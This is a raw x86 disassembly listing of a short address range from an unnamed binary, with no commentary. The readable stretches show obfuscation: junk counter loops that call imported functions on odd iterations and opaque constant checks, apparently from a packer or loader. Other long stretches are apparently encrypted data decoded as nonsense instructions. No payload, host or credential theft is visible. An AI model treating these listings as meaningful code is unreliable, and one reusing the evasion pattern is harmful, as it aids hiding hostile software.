  407ab7:	xchg   ecx,eax
  407ab8:	sub    eax,0x82c17a01
  407abd:	std    
  407abe:	and    dl,BYTE PTR [edx-0x2e]
  407ac1:	or     DWORD PTR [ebx-0x7d36d729],edx
  407ac7:	pop    es
  407ac8:	xchg   ebp,eax
  407ac9:	jecxz  0x407ac9
  407acb:	fadd   st(3),st
  407acd:	and    DWORD PTR [edi+0x10],ecx
  407ad0:	mov    ss,WORD PTR [ecx]
  407ad2:	mov    BYTE PTR [ecx-0x5d91c06a],ah
  407ad8:	cmp    eax,0x880822fe
  407add:	cmp    al,bl
  407adf:	sub    ebx,DWORD PTR ds:0x2ba35798
  407ae5:	mov    ch,0xaf
  407ae7:	enter  0x94d2,0x9
  407aeb:	sbb    eax,0x1879fcca
  407af0:	fdivr  DWORD PTR [edx]
  407af2:	fiadd  WORD PTR [ebp-0x2b]
  407af5:	rcr    BYTE PTR [ecx-0x10083ce],cl
  407afb:	xor    DWORD PTR [ecx+edx*1],0x4b
  407aff:	retf   0xdf01
  407b02:	dec    ecx
  407b03:	inc    esp
  407b04:	hlt    
  407b05:	sub    DWORD PTR [eax+0x192301b0],esi
  407b0b:	cwde   
  407b0c:	or     BYTE PTR [ecx-0x28],ch
  407b0f:	sar    BYTE PTR [ebp+0x77],cl
  407b12:	ins    BYTE PTR es:[edi],dx
  407b13:	arpl   WORD PTR [ebx-0x47cd893],si
  407b19:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407b1a:	xchg   ecx,eax
  407b1b:	push   cs
  407b1c:	add    BYTE PTR [ebp+0x6c],bh
  407b1f:	jno    0x407b33
  407b21:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407b22:	mov    ah,0x3d
  407b24:	mov    dl,BYTE PTR [esi-0x4f]
  407b27:	loop   0x407b93
  407b29:	sbb    eax,0x2d857b7d
  407b2e:	sti    
  407b2f:	popa   
  407b30:	sti    
  407b31:	inc    edi
  407b32:	fiadd  WORD PTR [esi+0x5b13e3d5]
  407b38:	xor    eax,ecx
  407b3a:	adc    DWORD PTR ds:0x43382b,0x1c6e
  407b44:	mov    esi,0x32729b
  407b49:	mov    DWORD PTR ds:0x4337d3,0x57a0
  407b53:	xor    ebx,ecx
  407b55:	add    DWORD PTR ds:0x433787,0x7d23
  407b5f:	xor    edx,edx
  407b61:	and    DWORD PTR ds:0x4338af,0x43378f
  407b6b:	add    eax,esi
  407b6d:	neg    DWORD PTR ds:0x43381f
  407b73:	add    ebx,esi
  407b75:	inc    DWORD PTR ds:0x433783
  407b7b:	div    ebx
  407b7d:	mov    edx,DWORD PTR [ebp-0x20]
  407b80:	mov    DWORD PTR ds:0x433827,0x7c8f
  407b8a:	mov    DWORD PTR [ebp-0x2c],0x4ec1
  407b91:	mov    DWORD PTR ds:0x43379f,0x3db9
  407b9b:	cmp    eax,DWORD PTR [edx]
  407b9d:	je     0x407f52
  407ba3:	mov    DWORD PTR ds:0x4337eb,0x500e
  407bad:	mov    DWORD PTR [ebp-0xc],0x705fd8f
  407bb4:	and    DWORD PTR ds:0x4337eb,0x1370
  407bbe:	lea    eax,[ebp-0xc]
  407bc1:	xor    edx,DWORD PTR ds:0x433857
  407bc7:	mov    DWORD PTR [ebp-0x10],eax
  407bca:	and    eax,eax
  407bcc:	mov    eax,DWORD PTR [ebp-0x10]
  407bcf:	mov    DWORD PTR ds:0x4337d7,0x11
  407bd9:	cmp    DWORD PTR ds:0x4337d7,0x0
  407be0:	je     0x407c31
  407be6:	cmp    DWORD PTR ds:0x4337d7,0x6
  407bed:	jne    0x407c03
  407bf3:	push   0x578e
  407bf8:	push   0x5398
  407bfd:	call   DWORD PTR ds:0x41229c
  407c03:	cmp    DWORD PTR ds:0x4337d7,0x7
  407c0a:	jne    0x407c1f
  407c10:	xor    edx,edx
  407c12:	add    edx,DWORD PTR ds:0x4337d7
  407c18:	dec    edx
  407c19:	mov    DWORD PTR ds:0x4337d7,edx
  407c1f:	mov    edx,DWORD PTR ds:0x4337d7
  407c25:	dec    edx
  407c26:	mov    DWORD PTR ds:0x4337d7,edx
  407c2c:	jmp    0x407bd9
  407c31:	mov    edx,DWORD PTR [eax]
  407c33:	imul   edx,edx,0xf89ea9ee
  407c39:	jmp    0x407e61
  407c3e:	and    BYTE PTR [edi-0x2b],al
  407c41:	out    0x71,al
  407c43:	je     0x407c76
  407c45:	inc    ecx
  407c46:	adc    al,0x2f
  407c48:	sbb    ecx,esi
  407c4a:	sbb    dl,ch
  407c4c:	out    dx,eax
  407c4d:	sub    BYTE PTR [ebx],0xcc
  407c50:	jle    0x407cd0
  407c52:	add    eax,0xa57e7e7c
  407c57:	mov    al,0xc4
  407c59:	in     al,0xf6
  407c5b:	cmp    DWORD PTR [ecx-0x5d23c48d],esi
  407c61:	shr    DWORD PTR [ecx+0x47],0x4c
  407c65:	(bad)  
  407c66:	fcom   DWORD PTR [edx+0x14]
  407c69:	jns    0x407c84
  407c6b:	xchg   ebp,eax
  407c6c:	popf   
  407c6d:	ins    BYTE PTR es:[edi],dx
  407c6e:	xlat   BYTE PTR ds:[ebx]
  407c6f:	rol    BYTE PTR [ecx],1
  407c71:	pop    ebx
  407c72:	loopne 0x407c97
  407c74:	and    eax,0x758a87a7
  407c79:	adc    eax,0x67f6d1a3
  407c7e:	adc    ch,al
  407c80:	mov    ecx,DWORD PTR [ecx-0x2a]
  407c83:	mov    al,BYTE PTR [edi]
  407c85:	dec    esi
  407c86:	iret   
  407c87:	inc    esp
  407c88:	(bad)  [ebx-0x2e716e5b]
  407c8e:	mov    edx,0xdd2c53fb
  407c93:	cli    
  407c94:	xlat   BYTE PTR ds:[ebx]
  407c95:	je     0x407cc4
  407c97:	sbb    al,0x21
  407c99:	enter  0x12a1,0x7f
  407c9d:	sub    eax,0xc7af1133
  407ca2:	push   eax
  407ca3:	xor    BYTE PTR [eax],cl
  407ca5:	out    dx,al
  407ca6:	xor    edx,DWORD PTR [ebx+0x6ea61777]
  407cac:	out    dx,eax
  407cad:	and    eax,0x2aa96850
  407cb2:	xor    dl,bh
  407cb4:	mov    bl,BYTE PTR [ecx]
  407cb6:	sar    BYTE PTR [eax],1
  407cb8:	retf   
  407cb9:	cmp    al,0x2c
  407cbb:	cmc    
  407cbc:	retf   
  407cbd:	(bad)  
  407cbf:	nop
  407cc0:	and    DWORD PTR [edi+0x6a],edi
  407cc3:	pop    ebp
  407cc4:	enter  0xab13,0x10
  407cc8:	jp     0x407ce4
  407cca:	dec    al
  407ccc:	rol    BYTE PTR [edx+0xf],1
  407ccf:	sub    al,0xfb
  407cd1:	mov    al,0x90
  407cd3:	(bad)  
  407cd4:	aam    0x17
  407cd6:	fs mov ah,0xfc
  407cd9:	mov    al,0x57
  407cdb:	xchg   edx,eax
  407cdc:	loope  0x407c98
  407cde:	and    eax,0xfea88b9a
  407ce3:	test   al,0xa2
  407ce5:	test   DWORD PTR [eax],edx
  407ce7:	adc    DWORD PTR [ebx+0x3b4f1f5e],0x2a
  407cee:	mov    al,0x91
  407cf0:	xor    al,0xb8
  407cf2:	aaa    
  407cf3:	aam    0x7c
  407cf5:	xor    al,0xe2
  407cf7:	arpl   WORD PTR [edx+0x81e4a0a],cx
  407cfd:	mov    esi,0x8f128fb0
  407d02:	shl    edi,cl
  407d04:	ja     0x407d6e
  407d06:	out    dx,al
  407d07:	xor    bl,dh
  407d09:	add    al,0x45
  407d0b:	loope  0x407cff
  407d0d:	(bad)  
  407d0e:	dec    edx
  407d0f:	cmp    bh,BYTE PTR [edi-0x62359e55]
  407d15:	lods   al,BYTE PTR ds:[esi]
  407d16:	in     eax,dx
  407d17:	sub    eax,0xd57cca72
  407d1c:	dec    esp
  407d1d:	jp     0x407d93
  407d1f:	std    
  407d20:	and    ch,BYTE PTR [edx-0x4c72d865]
  407d26:	frstor [esi]
  407d28:	aam    0xf5
  407d2a:	xchg   ecx,eax
  407d2b:	xor    esi,ebp
  407d2d:	in     eax,dx
  407d2e:	fbld   TBYTE PTR [eax]
  407d30:	push   ebp
  407d31:	add    eax,0x4ed90d6e
  407d36:	retf   0x5950
  407d39:	scas   al,BYTE PTR es:[edi]
  407d3a:	mov    ds:0x3765a7e4,eax
  407d3f:	in     al,0xeb
  407d41:	sahf   
  407d42:	jnp    0x407d37
  407d44:	inc    edx
  407d45:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407d46:	out    0x7e,eax
  407d48:	test   eax,0x5d38d76a
  407d4d:	sbb    esi,DWORD PTR [esi-0x2233ce86]
  407d53:	in     eax,dx
  407d54:	test   BYTE PTR [ecx],ah
  407d56:	cli    
  407d57:	and    BYTE PTR [ebx],dh
  407d59:	and    al,0x3a
  407d5b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407d5c:	push   edi
  407d5d:	mov    ah,0x78
  407d5f:	inc    ebp
  407d60:	cli    
  407d61:	cmc    
  407d62:	ins    BYTE PTR es:[edi],dx
  407d63:	or     cl,BYTE PTR [esi+esi*2-0x2ac5f623]
  407d6a:	dec    esp
  407d6b:	dec    esi
  407d6c:	add    eax,0xdc60ab7d
  407d71:	mov    edx,0xb5ed3a7a
  407d76:	jle    0x407cff
  407d78:	push   edi
  407d79:	enter  0x187e,0xbc
  407d7d:	jmp    0x928a:0x73cb770b
  407d84:	div    DWORD PTR [edx+edi*1-0x49]
  407d88:	sub    ebp,DWORD PTR [ebx+0x78]
  407d8b:	and    eax,0xc38eb191
  407d90:	dec    ecx
  407d91:	fstp   TBYTE PTR [ebx-0x5]
  407d94:	pushf  
  407d95:	lea    edi,[edx+0x12066204]
  407d9b:	int    0xef
  407d9d:	das    
  407d9e:	or     eax,ebx
  407da0:	sub    dl,BYTE PTR [ebx+0x5c]
  407da3:	adc    BYTE PTR ds:0x8656b8f4,ch
  407da9:	mov    bh,BYTE PTR [ebx]
  407dab:	sahf   
  407dac:	test   eax,0xb9decc58
  407db1:	bound  esi,QWORD PTR [ecx-0x13ebbfe2]
  407db7:	dec    ebp
  407db8:	mov    eax,0xf4ec1690
  407dbd:	or     eax,0x8994670a
  407dc2:	cdq    
  407dc3:	idiv   BYTE PTR [esi]
  407dc5:	ds cmc 
  407dc7:	xor    eax,0x2a89a83
  407dcc:	sar    DWORD PTR [esi+0x15],1
  407dcf:	mov    al,ds:0xb3c778ec
  407dd4:	push   edi
  407dd5:	repz xchg ebp,eax
  407dd7:	repz jno 0x407e52
  407dda:	xchg   DWORD PTR [eax+0x4d19f658],ebp
  407de0:	mov    DWORD PTR ds:0x140b89bc,edx
  407de6:	xlat   BYTE PTR gs:[ebx]
  407de8:	push   ebp
  407de9:	inc    ebp
  407dea:	cmp    al,0xa9
  407dec:	pop    es
  407ded:	imul   esi,DWORD PTR [esi-0x1],0xffffff9d
  407df1:	push   ss
  407df2:	mov    al,ds:0x9317c4b5
  407df7:	test   al,0x7
  407df9:	clc    
  407dfa:	inc    esi
  407dfb:	aad    0xfc
  407dfd:	outs   dx,BYTE PTR ds:[esi]
  407dfe:	add    eax,DWORD PTR [ebp+ebp*1+0x6ea40cfc]
  407e05:	jp     0x407df9
  407e07:	jnp    0x407e87
  407e09:	hlt    
  407e0a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407e0b:	xor    cl,dl
  407e0d:	xchg   ebp,eax
  407e0e:	es xchg ebx,eax
  407e10:	cmp    esp,DWORD PTR es:[ecx-0x1d]
  407e14:	mov    ebx,0x339b66c7
  407e19:	outs   dx,DWORD PTR ds:[esi]
  407e1a:	jmp    0x9bd32b73
  407e1f:	push   edx
  407e20:	bnd jg 0x407e42
  407e23:	out    0x45,eax
  407e25:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407e26:	or     DWORD PTR [edx-0x58a0d440],0xffffff93
  407e2d:	dec    edx
  407e2e:	fsubr  QWORD PTR [esi-0x4f4d0dfd]
  407e34:	jecxz  0x407ea4
  407e36:	xchg   ebp,eax
  407e37:	xor    al,0xd3
  407e39:	sub    al,0x5
  407e3b:	jno    0x407dc8
  407e3d:	push   eax
  407e3e:	push   ebx
  407e3f:	out    0xd2,eax
  407e41:	gs mov esi,0x8e45ac90
  407e47:	xchg   ebp,eax
  407e48:	mov    bl,0x17
  407e4a:	test   ch,0x7f
  407e4d:	cwde   
  407e4e:	ret    0xe712
  407e51:	fist   WORD PTR [edi+eiz*4-0x5e55997]
  407e58:	inc    ebp
  407e59:	mov    ecx,0x1e48b107
  407e5e:	sbb    al,0x6b
  407e60:	mov    cs,WORD PTR [ecx-0xbba74f0]
  407e66:	cmp    eax,0x823721f2
  407e6b:	je     0x407e88
  407e71:	mov    eax,DWORD PTR [ebp-0x1c]
  407e74:	or     DWORD PTR [eax],0x60751c9e
  407e7a:	mov    eax,DWORD PTR [ebp-0x8]
  407e7d:	xor    eax,ecx
  407e7f:	add    eax,esi
  407e81:	pop    edi
  407e82:	pop    esi
  407e83:	pop    ebx
  407e84:	leave  
  407e85:	ret    0x4
  407e88:	mov    eax,DWORD PTR [ebp-0xc]
  407e8b:	add    eax,DWORD PTR [ebp-0x18]
  407e8e:	cmp    eax,0x7ad64f9b
  407e93:	je     0x407ea7
  407e99:	mov    eax,DWORD PTR [ebp-0x10]
  407e9c:	and    DWORD PTR [eax],0x751c99
  407ea2:	jmp    0x407e7a
  407ea7:	mov    eax,DWORD PTR [ebp-0xc]
  407eaa:	mov    edx,DWORD PTR [ebp-0x18]
  407ead:	or     eax,edx
  407eaf:	cmp    eax,0xfabf2dfb
  407eb4:	je     0x407ec8
  407eba:	mov    eax,DWORD PTR [ebp-0x10]
  407ebd:	xor    DWORD PTR [eax],0x2650fa8f
  407ec3:	jmp    0x407e7a
  407ec8:	mov    ax,WORD PTR [ebp-0x4]
  407ecc:	mov    edi,DWORD PTR [ebp+0x8]
  407ecf:	mov    edi,DWORD PTR [edi]
  407ed1:	mov    edx,0x8a3c
  407ed6:	xor    ax,dx
  407ed9:	mov    edx,0x3b02
  407ede:	add    ax,dx
  407ee1:	cmp    ax,WORD PTR [edi]
  407ee4:	je     0x407f31
  407eea:	mov    eax,DWORD PTR [ebp-0x14]
  407eed:	xor    eax,ecx
  407eef:	add    eax,esi
  407ef1:	mov    DWORD PTR [ebp-0x24],eax
  407ef4:	mov    eax,DWORD PTR [ebp-0x28]
  407ef7:	mov    di,WORD PTR [ebp-0x2c]
  407efb:	mov    ebx,0x8a3c
  407f00:	xor    di,bx
  407f03:	add    di,dx
  407f06:	movzx  edx,di
  407f09:	mov    edi,DWORD PTR [ebp-0x8]
  407f0c:	xor    edi,ecx
  407f0e:	lea    edx,[edx+edi*1+0x32729b]
  407f15:	add    DWORD PTR [eax],edx
  407f17:	mov    eax,DWORD PTR [ebp-0x20]
  407f1a:	mov    edx,DWORD PTR [ebp-0x8]
  407f1d:	mov    edi,DWORD PTR [ebp-0x24]
  407f20:	xor    edx,ecx
  407f22:	add    edx,esi
  407f24:	imul   edx,edi
  407f27:	sub    DWORD PTR [eax],edx
  407f29:	mov    eax,DWORD PTR [ebp-0x14]
  407f2c:	jmp    0x407e7d
  407f31:	mov    eax,DWORD PTR [ebp-0xc]
  407f34:	mov    edx,DWORD PTR [ebp-0x18]
  407f37:	xor    eax,edx
  407f39:	cmp    eax,0x7aa80c5b
  407f3e:	je     0x407e7a
  407f44:	mov    eax,DWORD PTR [ebp-0x10]
  407f47:	add    DWORD PTR [eax],0x7403501
  407f4d:	jmp    0x407e7a
  407f52:	mov    eax,DWORD PTR [ebp-0x1c]
  407f55:	cmp    DWORD PTR [eax],edi
  407f57:	je     0x407e7a
  407f5d:	mov    eax,0x800f1c9a
  407f62:	jmp    0x407e81
  407f67:	push   ebp
  407f68:	mov    ebp,esp
  407f6a:	sub    esp,0x20
  407f6d:	adc    ecx,eax
  407f6f:	mov    eax,ds:0x413b34
  407f74:	mov    eax,DWORD PTR [eax+0x198]
  407f7a:	movzx  ecx,BYTE PTR ds:0x4337eb
  407f81:	or     DWORD PTR ds:0x4337ef,ecx
  407f87:	mov    DWORD PTR [ebp-0x8],eax
  407f8a:	or     DWORD PTR ds:0x433857,0x6995
  407f94:	mov    eax,DWORD PTR [ebp+0x8]
  407f97:	mov    ecx,DWORD PTR [ebp-0x8]
  407f9a:	or     DWORD PTR ds:0x433853,0x2a5
  407fa4:	push   ebx
  407fa5:	xor    ebx,ebx
  407fa7:	xor    ebx,DWORD PTR ds:0x43389b
  407fad:	sub    DWORD PTR ds:0x433827,ebx
  407fb3:	push   esi
  407fb4:	mov    esi,0x7510854
  407fb9:	sub    ebx,DWORD PTR ds:0x4337db
  407fbf:	xor    eax,esi
  407fc1:	and    DWORD PTR ds:0x43382b,0x0
  407fcb:	jmp    0x407fdd
  407fd0:	mov    ebx,DWORD PTR ds:0x43382b
  407fd6:	inc    ebx
  407fd7:	mov    DWORD PTR ds:0x43382b,ebx
  407fdd:	cmp    DWORD PTR ds:0x43382b,0x17
  407fe4:	jae    0x408024
  407fea:	cmp    DWORD PTR ds:0x43382b,0x7
  407ff1:	jne    0x408005
  407ff7:	push   0x433a67
  407ffc:	push   DWORD PTR [ebp-0x10]
  407fff:	call   DWORD PTR ds:0x4120d4
  408005:	cmp    DWORD PTR ds:0x43382b,0x6
  40800c:	jne    0x40801f
  408012:	mov    ebx,DWORD PTR ds:0x43382b
  408018:	inc    ebx
  408019:	mov    DWORD PTR ds:0x43382b,ebx
  40801f:	jmp    0x407fd0
  408024:	push   edi
  408025:	neg    ebx
  408027:	mov    edi,0x32729b
  40802c:	and    DWORD PTR ds:0x43382b,0x0
  408036:	jmp    0x408048
  40803b:	mov    ebx,DWORD PTR ds:0x43382b
  408041:	inc    ebx
  408042:	mov    DWORD PTR ds:0x43382b,ebx
  408048:	cmp    DWORD PTR ds:0x43382b,0x1c
  40804f:	jae    0x408092
  408055:	cmp    DWORD PTR ds:0x43382b,0x9
  40805c:	jne    0x40806d
  408062:	push   0x214e
  408067:	call   DWORD PTR ds:0x4122a0
  40806d:	cmp    DWORD PTR ds:0x43382b,0x8
  408074:	jne    0x408087
  40807a:	mov    ebx,DWORD PTR ds:0x43382b
  408080:	inc    ebx
  408081:	mov    DWORD PTR ds:0x43382b,ebx
  408087:	jmp    0x40803b
  40808c:	sub    ebx,0x76f3
  408092:	add    eax,edi
  408094:	mov    DWORD PTR [ecx],eax
  408096:	add    DWORD PTR ds:0x43377b,0x1c72
  4080a0:	lea    eax,[ebp-0x4]
  4080a3:	not    ebx
  4080a5:	mov    DWORD PTR [ebp-0x10],eax
  4080a8:	mov    eax,DWORD PTR [ebp+0x8]
  4080ab:	mov    ebx,DWORD PTR ds:0x43385b
  4080b1:	and    DWORD PTR ds:0x433863,ebx
  4080b7:	mov    ecx,DWORD PTR [ebp-0x10]
  4080ba:	and    DWORD PTR ds:0x43381b,0x5cf4
  4080c4:	xor    eax,esi
  4080c6:	add    eax,edi
  4080c8:	mov    DWORD PTR [ecx],eax
  4080ca:	and    DWORD PTR ds:0x4338a3,0x0
  4080d4:	xor    ebx,ebx
  4080d6:	or     ebx,DWORD PTR ds:0x4338a3
  4080dc:	inc    ebx
  4080dd:	mov    DWORD PTR ds:0x4338a3,ebx
  4080e3:	cmp    DWORD PTR ds:0x4338a3,0x8
  4080ea:	jne    0x408101
  4080f0:	push   DWORD PTR [ebp-0x10]
  4080f3:	push   0x43385b
  4080f8:	push   DWORD PTR [ebp-0x1c]
  4080fb:	call   DWORD PTR ds:0x412350
  408101:	cmp    DWORD PTR ds:0x4338a3,0x7
  408108:	jne    0x40811d
  40810e:	xor    ebx,ebx
  408110:	add    ebx,DWORD PTR ds:0x4338a3
  408116:	inc    ebx
  408117:	mov    DWORD PTR ds:0x4338a3,ebx
  40811d:	cmp    DWORD PTR ds:0x4338a3,0x1a
  408124:	jb     0x4080d4
  40812a:	mov    DWORD PTR [ebp-0x14],0xf89c8531
  408131:	mov    DWORD PTR ds:0x433897,0x1f
  40813b:	cmp    DWORD PTR ds:0x433897,0x0
  408142:	je     0x40817a
  408148:	cmp    DWORD PTR ds:0x433897,0x23
  40814f:	jne    0x408168
  408155:	push   DWORD PTR [ebp-0x1c]
  408158:	push   0x3614
  40815d:	push   0x7
  40815f:	push   DWORD PTR [ebp-0xc]
  408162:	call   DWORD PTR ds:0x4120d8
  408168:	mov    ecx,DWORD PTR ds:0x433897
  40816e:	dec    ecx
  40816f:	mov    DWORD PTR ds:0x433897,ecx
  408175:	jmp    0x40813b
  40817a:	lea    eax,[ebp-0x14]
  40817d:	jmp    0x4083c4
  408182:	ss xor esi,ebp
  408185:	lods   eax,DWORD PTR ds:[esi]
  408186:	jmp    0xc3f1f6fc
  40818b:	push   es
  40818c:	mov    ebp,0x11b64c0d
  408191:	xchg   esp,eax
  408192:	ds retf 0x7e7e
  408196:	and    al,0x7c
  408198:	jle    0x408218
  40819a:	jae    0x40815a
  40819c:	jg     0x4081f0
  40819e:	aad    0xe1
  4081a0:	fwait
  4081a1:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  4081a3:	mov    dl,0x7
  4081a5:	and    al,BYTE PTR [ebp+0x4f]
  4081a8:	outs   dx,DWORD PTR ds:[esi]
  4081a9:	popa   
  4081aa:	sbb    ecx,DWORD PTR [edi+0x67ff7109]
  4081b0:	popa   
  4081b1:	cmp    al,0x2c
  4081b3:	or     DWORD PTR [edi+0x2a],edi
  4081b6:	popf   
  4081b7:	mov    ebp,0x36047d60
  4081bc:	daa    
  4081bd:	and    al,0x5a
  4081bf:	test   eax,0x5111536c
  4081c4:	in     eax,dx
  4081c5:	push   esi
  4081c6:	add    DWORD PTR [ebx+eiz*4+0x14],eax
  4081ca:	mov    dl,0x4f
  4081cc:	(bad)  
  4081cd:	pop    ebp
  4081ce:	push   cs
  4081cf:	test   al,0x8
  4081d1:	or     al,0x5f
  4081d3:	add    esi,eax
  4081d5:	rol    DWORD PTR [eax+esi*4],1
  4081d8:	cwde   
  4081d9:	(bad)  
  4081da:	rcl    esp,cl
  4081dc:	aad    0x11
  4081de:	es add eax,0x8eeb06ba
  4081e4:	mov    esi,0x993c721b
  4081e9:	and    al,0xe9
  4081eb:	stos   DWORD PTR es:[edi],eax
  4081ec:	ja     0x408206
  4081ee:	push   0x82d2c7ff
  4081f3:	and    ah,BYTE PTR [ebx]
  4081f5:	xchg   edx,ebx
  4081f7:	nop
  4081f8:	pop    esi
  4081f9:	adc    eax,0x330d2133
  4081fe:	jp     0x4081af
  408200:	push   edx
  408201:	sbb    BYTE PTR [edx-0x71],dh
  408204:	and    al,0x94
  408206:	sbb    DWORD PTR [esi+0xf13319b],ebp
  40820c:	and    eax,0x1f382dc8
  408211:	xchg   DWORD PTR [ecx],ebx
  408213:	mov    cl,0x28
  408215:	enter  0x4620,0xc9
  408219:	push   es
  40821a:	sbb    edi,esi
  40821c:	in     al,dx
  40821d:	jmp    0xef0b:0xaa603023
  408224:	enter  0x546b,0x92
  408228:	and    edx,DWORD PTR [ebx]
  40822a:	pop    edi
  40822b:	cmp    DWORD PTR [ebx],0xffffffc9
  40822e:	mov    esp,0x88e342a3
  408233:	popa   
  408234:	lea    esp,[ebx]
  408236:	xor    DWORD PTR [ecx+0x7a],esp
  408239:	das    
  40823a:	fwait
  40823b:	xchg   DWORD PTR [esi+0x1a],edi
  40823e:	or     eax,0x8b5c231d
  408243:	mov    ebx,0xeb71329d
  408248:	test   DWORD PTR [ebx+0x36b4d7bc],esp
  40824e:	xchg   DWORD PTR [edi+0x3c],esi
  408251:	data16 jns 0x408248
  408254:	dec    edx
  408255:	test   eax,0xbb7e90a8
  40825a:	stos   BYTE PTR es:[edi],al
  40825b:	sub    ebx,DWORD PTR [ecx+edi*4]
  40825e:	and    eax,0xb843e598
  408263:	sub    BYTE PTR [edi],al
  408265:	mov    eax,0x6b11a540
  40826a:	in     al,0x68
  40826c:	sbb    eax,eax
  40826e:	mov    cl,0x7f
  408270:	inc    esp
  408271:	out    dx,eax
  408272:	call   0x4e86:0x837a6a1a
  408279:	ins    DWORD PTR es:[edi],dx
  40827a:	pop    ss
  40827b:	cmp    BYTE PTR [eax-0x69bc6941],bl
  408281:	(bad)  
  408282:	xchg   ecx,eax
  408283:	dec    edi
  408284:	(bad)  
  408285:	in     al,dx
  408286:	add    al,0x7e
  408288:	iret   
  408289:	xchg   ecx,eax
  40828a:	mov    edx,0xcdbdf4cc
  40828f:	push   esp
  408290:	stos   BYTE PTR es:[edi],al
  408291:	sti    
  408292:	cs jge 0x408240
  408295:	jle    0x408274
  408297:	pop    eax
  408298:	jl     0x4082b8
  40829a:	std    
  40829b:	fnstenv [ecx-0x6aff61fb]
  4082a1:	mov    dh,0xa7
  4082a3:	adc    BYTE PTR [edi+0x86a9285],bl
  4082a9:	dec    ebp
  4082aa:	cdq    
  4082ab:	push   ecx
  4082ac:	std    
  4082ad:	xchg   edx,eax
  4082ae:	scas   al,BYTE PTR es:[edi]
  4082af:	popa   
  4082b0:	and    eax,0x8e32d805
  4082b5:	call   0xb66e:0x3eddf3e1
  4082bc:	xchg   ebp,eax
  4082bd:	sbb    ch,BYTE PTR [eax]
  4082bf:	jmp    0x92344d0f
  4082c4:	or     BYTE PTR [edi*4+0x7929ded0],ch
  4082cb:	test   BYTE PTR [ebx],dh
  4082cd:	xchg   edx,eax
  4082ce:	add    ecx,DWORD PTR [ecx]
  4082d0:	or     ebx,ebx
  4082d2:	hlt    
  4082d3:	out    0xec,eax
  4082d5:	sub    eax,0xdcbd97c8
  4082da:	retf   
  4082db:	xor    edx,DWORD PTR [edi-0x3e]
  4082de:	call   0x148c:0xd2c27c49
  4082e5:	test   eax,0x7a03a912
  4082ea:	shl    DWORD PTR [eax],0x77
  4082ed:	and    al,0xed
  4082ef:	inc    DWORD PTR [ecx-0x47]
  4082f2:	shl    dl,0xdd
  4082f5:	sub    BYTE PTR [edi+0x697fe208],0x98
  4082fc:	sysenter 
  4082fe:	sub    BYTE PTR ds:[edx-0x3f],ch
  408302:	adc    DWORD PTR [edx-0x34b836c3],esp
  408308:	and    ebx,esi
  40830a:	(bad)  
  40830b:	scas   al,BYTE PTR es:[edi]
  40830c:	xchg   ebp,eax
  40830d:	pop    esi
  40830e:	mov    edi,0x19735c2e
  408313:	cmp    bh,BYTE PTR [esi]
  408315:	adc    BYTE PTR [esi+0x552fbc4c],ah
  40831b:	rcr    bl,0x9
  40831e:	ss js  0x4082bf
  408321:	rcl    BYTE PTR [edx],0x4f
  408324:	mov    WORD PTR [ebx],fs
  408326:	jo     0x40836d
  408328:	call   DWORD PTR [ecx+0x41]
  40832b:	xchg   ebp,eax
  40832c:	mov    esi,0xa1078e05
  408331:	retf   
  408332:	mov    DWORD PTR [edx+ebx*2+0x650789e5],eax
  408339:	push   ecx
  40833a:	fadd   DWORD PTR [edi]
  40833c:	add    ecx,DWORD PTR [ebp+ebx*1+0x74]
  408340:	es push ebx
  408342:	cmp    dl,BYTE PTR [edi]
  408344:	dec    edx
  408345:	jp     0x408379
  408347:	xchg   edx,eax
  408348:	inc    esp
  408349:	push   edx
  40834a:	xchg   ecx,eax
  40834b:	mov    ebx,0xac234cdb
  408350:	push   esi
  408351:	cs jnp 0x4083cf
  408354:	loope  0x408326
  408356:	inc    esp
  408357:	pop    esp
  408358:	mov    ss,WORD PTR [edx]
  40835a:	loopne 0x4082e9
  40835c:	or     ebp,DWORD PTR [ebx+0x3bd4f7fd]
  408362:	xlat   BYTE PTR ds:[ebx]
  408363:	lahf   
  408364:	push   esp
  408365:	rcl    DWORD PTR [edi+0x34e6435c],cl
  40836b:	pop    eax
  40836c:	sar    BYTE PTR [ebp+eax*1-0x497c0f21],1
  408373:	pop    edx
  408374:	and    ebx,DWORD PTR ds:0x97d669b1
  40837a:	jl     0x40833a
  40837c:	dec    edx
  40837d:	ret    0x9b56
  408380:	test   BYTE PTR [edx+0x4314d56d],dh
  408386:	push   esi
  408387:	pop    ebp
  408388:	push   esi
  408389:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40838a:	cdq    
  40838b:	aaa    
  40838c:	or     ebp,DWORD PTR [ebx+eax*4-0x10]
  408390:	jo     0x4083a3
  408392:	nop
  408393:	dec    ecx
  408394:	mov    ah,BYTE PTR [esi-0x53]
  408397:	push   ds
  408398:	xchg   edi,eax
  408399:	xor    DWORD PTR [ecx-0x5e],0xffffffb5
  40839d:	je     0x40841d
  40839f:	ds adc al,0x4e
  4083a2:	pop    ecx
  4083a3:	call   0x6dc9:0xe1151090
  4083aa:	outs   dx,BYTE PTR ds:[esi]
  4083ab:	mov    dh,0xd7
  4083ad:	fld    TBYTE PTR [eax-0x2b]
  4083b0:	rcl    DWORD PTR [esi+0x38],0xf2
  4083b4:	bound  edx,QWORD PTR [eax+edx*1-0x8d370ed]
  4083bb:	ins    DWORD PTR es:[edi],dx
  4083bc:	sbb    eax,0xb94a1d6f
  4083c1:	test   BYTE PTR [edx+eax*4],dh
  4083c4:	mov    DWORD PTR [ebp-0x20],eax
  4083c7:	and    DWORD PTR ds:0x4337db,0x0
  4083d1:	mov    eax,ds:0x4337db
  4083d6:	inc    eax
  4083d7:	mov    ds:0x4337db,eax
  4083dc:	cmp    DWORD PTR ds:0x4337db,0x6
  4083e3:	jne    0x4083f7
  4083e9:	push   DWORD PTR [ebp-0x20]
  4083ec:	push   0x3975
  4083f1:	call   DWORD PTR ds:0x412354
  4083f7:	cmp    DWORD PTR ds:0x4337db,0x5
  4083fe:	jne    0x408412
  408404:	xor    eax,eax
  408406:	or     eax,DWORD PTR ds:0x4337db
  40840c:	inc    eax
  40840d:	mov    ds:0x4337db,eax
  408412:	cmp    DWORD PTR ds:0x4337db,0x19
  408419:	jb     0x4083d1
  40841f:	inc    ebx
